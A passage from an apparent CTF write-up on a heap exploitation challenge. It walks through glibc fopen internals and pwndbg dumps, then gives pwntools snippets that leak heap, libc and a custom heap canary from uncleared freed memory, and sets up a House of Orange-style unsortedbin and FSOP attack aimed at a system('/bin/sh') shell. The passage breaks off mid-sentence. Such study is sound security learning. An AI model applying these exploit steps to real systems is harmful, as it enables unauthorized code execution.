class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE)); <span class="comment">// malloc call here</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f); <span class="comment">// free call here</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>So a malloc of <strong>struct locked_FILE</strong> is executed, this struct will store <strong>IO_FILE</strong> pointers and the <strong>/dev/urandom</strong> data.</p><p><strong>struct _IO_FILE_plus</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Look in memory after running <strong>fopen</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/YycUFqi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YycUFqi.png" alt><br></a><br><strong>struct _IO_wide_data</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>The look in memory:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((_IO_lock_t*)0x000055dc452ed0f0)                                                                                 [33/1706]</span><br><span class="line">$15 = &#123;</span><br><span class="line">  lock = 0, </span><br><span class="line">  cnt = 0, </span><br><span class="line">  owner = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *((struct _IO_wide_data*)0x55dc452ed100)</span><br><span class="line">$16 = &#123;</span><br><span class="line">  _IO_read_ptr = 0x0, </span><br><span class="line">  _IO_read_end = 0x0, </span><br><span class="line">  _IO_read_base = 0x0, </span><br><span class="line">  _IO_write_base = 0x0, </span><br><span class="line">  _IO_write_ptr = 0x0, </span><br><span class="line">  _IO_write_end = 0x0, </span><br><span class="line">  _IO_buf_base = 0x0, </span><br><span class="line">  _IO_buf_end = 0x0, </span><br><span class="line">  _IO_save_base = 0x0, </span><br><span class="line">  _IO_backup_base = 0x0, </span><br><span class="line">  _IO_save_end = 0x0, </span><br><span class="line">  _IO_state = &#123;</span><br><span class="line">    __count = 0, </span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0, </span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  _IO_last_state = &#123;</span><br><span class="line">    __count = 0, </span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0, </span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line"></span><br><span class="line">  _codecvt = &#123;                                                                                                                </span><br><span class="line">    __codecvt_destr = 0x0, </span><br><span class="line">    __codecvt_do_out = 0x0, </span><br><span class="line">    __codecvt_do_unshift = 0x0, </span><br><span class="line">    __codecvt_do_in = 0x0, </span><br><span class="line">    __codecvt_do_encoding = 0x0, </span><br><span class="line">    __codecvt_do_always_noconv = 0x0, </span><br><span class="line">    __codecvt_do_length = 0x0, </span><br><span class="line">    __codecvt_do_max_length = 0x0, </span><br><span class="line">    __cd_in = &#123;</span><br><span class="line">      __cd = &#123;</span><br><span class="line">        __nsteps = 0, </span><br><span class="line">        __steps = 0x0, </span><br><span class="line">        __data = 0x55dc452ed1b8</span><br><span class="line">      &#125;, </span><br><span class="line">      __combined = &#123;</span><br><span class="line">        __cd = &#123;</span><br><span class="line">          __nsteps = 0, </span><br><span class="line">          __steps = 0x0, </span><br><span class="line">          __data = 0x55dc452ed1b8</span><br><span class="line">        &#125;, </span><br><span class="line">        __data = &#123;</span><br><span class="line">          __outbuf = 0x0, </span><br><span class="line">          __outbufend = 0x0, </span><br><span class="line">          __flags = 0, </span><br><span class="line">          __invocation_counter = 0, </span><br><span class="line">          __internal_use = 0, </span><br><span class="line">          __statep = 0x0, </span><br><span class="line">          __state = &#123;</span><br><span class="line">            __count = 0, </span><br><span class="line">            __value = &#123;</span><br><span class="line">              __wch = 0, </span><br><span class="line">              __wchb = &quot;\000\000\000&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    __cd_out = &#123;</span><br><span class="line">      __cd = &#123;</span><br><span class="line">        __nsteps = 0, </span><br><span class="line">        __steps = 0x0, </span><br><span class="line">        __data = 0x55dc452ed1f8</span><br><span class="line">      &#125;, </span><br><span class="line">      __combined = &#123;</span><br><span class="line">        __cd = &#123;</span><br><span class="line">          __nsteps = 0, </span><br><span class="line">          __steps = 0x0, </span><br><span class="line">          __data = 0x55dc452ed1f8</span><br><span class="line">        &#125;, </span><br><span class="line">        __data = &#123;</span><br><span class="line">          __outbuf = 0x0, </span><br><span class="line">          __outbufend = 0x0, </span><br><span class="line">          __flags = 0, </span><br><span class="line">          __invocation_counter = 0, </span><br><span class="line">          __internal_use = 0, </span><br><span class="line">          __statep = 0x0, </span><br><span class="line">          __state = &#123;</span><br><span class="line">            __count = 0, </span><br><span class="line">            __value = &#123;</span><br><span class="line">              __wch = 0, </span><br><span class="line">              __wchb = &quot;\000\000\000&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  _shortbuf = L&quot;&quot;, </span><br><span class="line">  _wide_vtable = 0x7fb6d6371260 &lt;_IO_wfile_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The <strong>/dev/urandom</strong> data:<br><a data-fancybox="gallery" href="https://i.imgur.com/qMiuNZS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qMiuNZS.png" alt><br></a><br>This data is <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/iofopen.c#L79" target="_blank" rel="noopener">freed</a> but not cleared which means later we can leak this data by overlapping new chunks and use the <strong>print</strong> function to leak <strong>libc</strong>, <strong>heap</strong> and even the <strong>heap canary</strong> created by this library.  </p><p><strong>securealloc</strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/qMiuNZS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Vkfyzmz.png" alt><br></a></p><p><strong>securealloc</strong> adds 0x10 more bytes to the allocated space to store a canary at the end of the chunk and the size at the beginning:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__<span class="function">fastcall <span class="title">secure_malloc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size + <span class="number">0x10</span>); <span class="comment">// integer overflow here btw :)</span></span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    __abort((__int64)<span class="string">"Resource depletion (secure_malloc)"</span>);</span><br><span class="line">  *v2 = size;</span><br><span class="line">  v2[<span class="number">1</span>] = size + <span class="number">1</span>;</span><br><span class="line">  *(_QWORD *)((<span class="keyword">char</span> *)v2 + size + <span class="number">8</span>) = canary;</span><br><span class="line">  <span class="keyword">return</span> v2 + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is an integer overflow at <strong>malloc(size + 0x10)</strong> this could also be used to bypass the canary unfortunately the canary is going to be stored at a very <strong>high heap address</strong> which is unmapped we would have to expand the heap multiple times to get a mappable address, while this is feasible to do it locally it isn’t remotely because while there is a limit restriction of memory on the server we also would take 1 or 2 hours to do it (because we are communicating remotely).</p><p><strong>securefree</strong>  </p><p><a data-fancybox="gallery" href="https://i.imgur.com/NyeP7Hq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NyeP7Hq.png" alt><br></a></p><p>There is a double free verification and also wipes out the chunk data before freeing.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">secure_free</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = *(_DWORD *)(a1 - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 - <span class="number">4</span>) - v1 != <span class="number">1</span> )</span><br><span class="line">      __abort((__int64)<span class="string">"*** double free detected ***: &lt;unknown&gt; terminated"</span>);</span><br><span class="line">    __heap_chk_fail(a1);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)(a1 - <span class="number">8</span>), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 + <span class="number">16</span>));</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)(a1 - <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;.</span><br></pre></td></tr></table></figure></p><p><strong>_heap_chk_fail</strong></p><p>this the function that verifies if there is a heap overflow.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall _heap_chk_fail(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_DWORD *)(a1 - <span class="number">8</span>);</span><br><span class="line">    result = *(_DWORD *)(a1 - <span class="number">4</span>) - v2;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = canary;</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(v2 + a1) != canary )</span><br><span class="line">        __abort((__int64)<span class="string">"*** heap smashing detected ***: &lt;unknown&gt; terminated"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LEAK-heap-and-libc-address"><a href="#LEAK-heap-and-libc-address" class="headerlink" title="LEAK heap and libc address"></a>LEAK heap and libc address</h3><p>This the looks of the memory after <strong>secure_init</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/7CfvJBb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7CfvJBb.png" alt><br></a></p><p>To leak both we can first allocate a chunk of 0x60 and then 0x30 (this one leaks heap) and then 0x10 (this one will leak IO_JUMP libc address).</p><p><a data-fancybox="gallery" href="https://i.imgur.com/crnR1Uz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/crnR1Uz.png" alt><br></a></p><p>The python code to do this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>) <span class="comment"># this one is freed for a reason this will be explained later</span></span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">HEAPADDR = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">HEAP = HEAPADDR - <span class="number">0xf0</span></span><br><span class="line">log.info(<span class="string">"HEAPADDR 0x%x"</span> % HEAPADDR)</span><br><span class="line">log.info(<span class="string">"HEAP 0x%x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">IOFILEJUMPS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>)) <span class="comment"># _IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">LIBC = IOFILEJUMPS - libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">_IO_LIST_ALL = LIBC + libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"IO_file_jumps 0x%x"</span> % IOFILEJUMPS)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br></pre></td></tr></table></figure><h3 id="Leak-canary"><a href="#Leak-canary" class="headerlink" title="Leak canary"></a>Leak canary</h3><p>The canary is located at <strong>/dev/urandom</strong> data:  </p><p><a data-fancybox="gallery" href="https://i.imgur.com/d7frMoF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/d7frMoF.png" alt><br></a></p><p>We do the same thing by allocating first a chunk of data <strong>0x140</strong> and then <strong>0x8</strong>:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap canary (/dev/urandom buffer)</span></span><br><span class="line">add(<span class="number">0x140</span>)</span><br><span class="line">add(<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">HEAPCANARY = u64(r.recvline().rstrip()[<span class="number">-7</span>::].rjust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"HEAPCANARY 0x%x"</span> % HEAPCANARY)</span><br></pre></td></tr></table></figure><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><p>This isn’t exactly <strong>house of orange</strong>, house of orange usually is used when there isn’t a possibility of using a free by forcing the heap to expand by triggering <strong>sysmalloc</strong> when the <strong>top_chunk</strong> has no more space to allocate freeing the topchunk… In our case we just want to convert the <strong>freed</strong> <strong>0x60</strong> sized chunk we freed previously into a <strong>smallbin</strong> so we can later use an <strong>unsortedbin attack</strong> with <strong>File Stream Oriented Programming</strong> to get a system(‘/bin/sh’) shell.</p><p>So this is the moment right before we allocate a chunk of <strong>0x3e0</strong> (0x3e0+0x10 &gt; 1000 in decimal):<br><a data-fancybox="gallery" href="https://i.imgur.com/s4LphAD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/s4LphAD.png" alt><br></a><br>Now after executing malloc this fastbin chunk will be transformed into a <strong>smallbin</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/wmDqbx0.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/wmDqbx0.png" alt><br></a></p><h3 id="File-Stream-Oriented-Programming"><a href="#File-Stream-Oriented-Programming" class="headerlink" title="File Stream Oriented Programming"></a>File Stream Oriented Programming</h3><p>We know that <strong>ROP</strong> can be used to hijack the control flow of the program, this can also be achieved by using <strong>file stream oriented programming</strong> but this one is achieved through an attack at <strong>File Stream</strong>.</p><p>We need to first understand <strong>malloc</strong> error message, which <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3384" target="_blank" rel="noopener">malloc_printerr</a> is the function used to print the error:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">    errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>the function is calls <strong>__libc_message</strong> after the abort function is called. The structure inside is used here, and the method of calling the virtual table is triggered.</p><p><strong>abort</strong> -&gt; <strong>_IO_flush_all_lockp</strong> -&gt; <strong>_IO_list_all</strong></p><p>We can use the heap overflow to change the smallbin bk and implement the unsortbin attack, bk address should point to _IO_list_all -0x10 so we can modify corrupt <strong>_IO_list_all</strong>.</p><p>Here is how <strong>_IO_list_all</strong> looks in memory:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)0x7f742fb8db78)</span><br><span class="line">$13 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xf12befc0, </span><br><span class="line">    _IO_read_ptr = 0x559af129d4f0 &quot;&quot;, </span><br><span class="line">    _IO_read_end = 0x559af129d4f0 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7f742fb8e510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, </span><br><span class="line">    _IO_write_end = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, </span><br><span class="line">    _IO_save_base = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, </span><br><span class="line">    _IO_backup_base = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, </span><br><span class="line">    _IO_save_end = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, </span><br><span class="line">    _markers = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, </span><br><span class="line">    _chain = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, </span><br><span class="line">    _fileno = 0x2fb8dbd8, </span><br><span class="line">    _flags2 = 0x7f74, </span><br><span class="line">    _old_offset = 0x7f742fb8dbd8, </span><br><span class="line">    _cur_column = 0xdbe8, </span><br><span class="line">    _vtable_offset = 0xb8, </span><br><span class="line">    _shortbuf = &quot;/&quot;, </span><br><span class="line">    _lock = 0x7f742fb8dbe8 &lt;main_arena+200&gt;, </span><br><span class="line">    _offset = 0x7f742fb8dbf8, </span><br><span class="line">    _codecvt = 0x7f742fb8dbf8 &lt;main_arena+216&gt;, </span><br><span class="line">    _wide_data = 0x7f742fb8dc08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_list = 0x7f742fb8dc08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_buf = 0x7f742fb8dc18 &lt;main_arena+248&gt;, </span><br><span class="line">    __pad5 = 0x7f742fb8dc18, </span><br><span class="line">    _mode = 0x2fb8dc28, </span><br><span class="line">    _unused2 = &quot;t\177\000\000(?/t\177\000\000\070?/t&quot;...</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f742fb8dc38 &lt;main_arena+280&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We need to 